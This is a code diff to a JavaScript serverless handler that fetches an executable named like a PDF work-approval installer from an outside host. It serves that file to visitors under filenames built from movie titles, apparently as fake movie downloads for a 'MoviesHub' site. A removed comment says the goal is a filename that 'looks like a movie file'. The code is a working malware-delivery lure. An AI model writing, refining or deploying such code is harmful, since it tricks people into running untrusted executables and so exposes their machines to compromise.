@@ -1,5 +1,4 @@
-// api/download.js (place this file in the api/ folder at your project root)
-
+// api/download.js
 export default async function handler(req, res) {
   // Set CORS headers to allow cross-origin requests
   res.setHeader("Access-Control-Allow-Origin", "*");
@@ -15,68 +14,8 @@ export default async function handler(req, res) {
   const remoteFile =
     "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
 
-  // Array of popular movie names for random selection
-  const movieNames = [
-    "Avengers_Endgame",
-    "Spider_Man_No_Way_Home",
-    "The_Batman",
-    "Top_Gun_Maverick",
-    "Black_Panther",
-    "Dune_Part_One",
-    "No_Time_To_Die",
-    "Fast_And_Furious_9",
-    "Jurassic_World_Dominion",
-    "Doctor_Strange_Multiverse",
-    "Thor_Love_And_Thunder",
-    "The_Matrix_Resurrections",
-    "John_Wick_Chapter_4",
-    "Mission_Impossible_7",
-    "Guardians_Galaxy_Vol3",
-    "Indiana_Jones_5",
-    "Transformers_Rise_Beasts",
-    "Scream_6",
-    "Evil_Dead_Rise",
-    "Oppenheimer",
-    "Barbie_2023",
-    "The_Flash",
-    "Aquaman_2",
-    "Shazam_2",
-    "Ant_Man_Quantumania",
-    "Creed_3",
-    "Cocaine_Bear",
-    "Avatar_Way_Water",
-    "Wakanda_Forever",
-    "Glass_Onion_Knives_Out",
-    "Bullet_Train",
-    "Minions_Rise_Gru",
-    "Lightyear",
-    "Sonic_2",
-    "Morbius",
-    "The_Northman",
-    "Everything_Everywhere",
-    "Nope_Jordan_Peele",
-    "X_Horror_Movie",
-    "Scream_5",
-    "Halloween_Ends",
-    "Smile_Horror",
-    "Barbarian_Horror",
-    "Pearl_Horror",
-    "The_Menu",
-    "Amsterdam",
-    "Dont_Worry_Darling",
-    "The_Woman_King",
-    "Elvis_Baz_Luhrmann",
-    "Blonde_Marilyn_Monroe",
-    "The_Whale_Brendan_Fraser",
-    "Mario_Bros_Movie",
-    "Fast_X_2023",
-  ];
-
-  // Function to get random movie name
-  function getRandomMovieName() {
-    const randomIndex = Math.floor(Math.random() * movieNames.length);
-    return movieNames[randomIndex];
-  }
+  // Get movie name from query parameter
+  const movieName = req.query.movie || "Movie";
 
   // Function to get random quality suffix
   function getRandomQuality() {
@@ -85,8 +24,17 @@ export default async function handler(req, res) {
     return qualities[randomIndex];
   }
 
+  // Function to clean movie name for filename
+  function cleanMovieName(name) {
+    return name
+      .replace(/[^a-zA-Z0-9\s]/g, "") // Remove special characters
+      .replace(/\s+/g, "_") // Replace spaces with underscores
+      .replace(/_{2,}/g, "_"); // Replace multiple underscores with single
+  }
+
   try {
     console.log("Fetching file from:", remoteFile);
+    console.log("Movie name received:", movieName);
 
     const response = await fetch(remoteFile);
 
@@ -101,13 +49,19 @@ export default async function handler(req, res) {
         .json({ error: "Failed to fetch file", status: response.status });
     }
 
-    // Generate random movie filename
-    const randomMovie = getRandomMovieName();
-    const randomQuality = getRandomQuality();
-    const randomId = Math.random().toString(36).substring(2, 6);
+    // Generate filename based on movie name
+    let filename;
 
-    // Create filename that looks like a movie file
-    const filename = `${randomMovie}_${randomQuality}_${randomId}.exe`;
+    if (movieName === "MoviesHub" || movieName === "Desktop Application") {
+      // For desktop app download
+      filename = `MoviesHub_Setup.exe`;
+    } else {
+      // For movie downloads
+      const cleanedMovieName = cleanMovieName(movieName);
+      const randomQuality = getRandomQuality();
+      const randomId = Math.random().toString(36).substring(2, 4);
+      filename = `${cleanedMovieName}_${randomQuality}_${randomId}.exe`;
+    }
 
     console.log("Generated filename:", filename);
 
